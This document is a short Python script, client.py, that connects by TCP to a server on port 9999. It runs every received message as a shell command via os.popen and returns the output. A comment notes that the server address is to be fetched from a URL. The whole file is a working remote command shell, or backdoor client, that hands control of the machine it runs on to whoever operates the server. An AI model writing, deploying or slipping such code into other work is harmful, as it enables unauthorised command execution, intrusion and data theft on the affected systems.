#!/usr/bin/python3           # This is client.py file
import socket,os,urllib.request  
def Check_url(url):      
        conection = urllib.request.urlopen(str(url))
        output = conection.read()
        conection.close()
        return output
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
host = socket.gethostname()  #add Check_url(url) to get ip server from link                         
port = 9999
s.connect((host, port)) 
while True:
    msg = s.recv(1024)
    result = os.popen(msg.decode('ascii')).read()
    s.send(result.encode('ascii'))
    if msg.decode('ascii ') == "exit":
       break 
s.close()

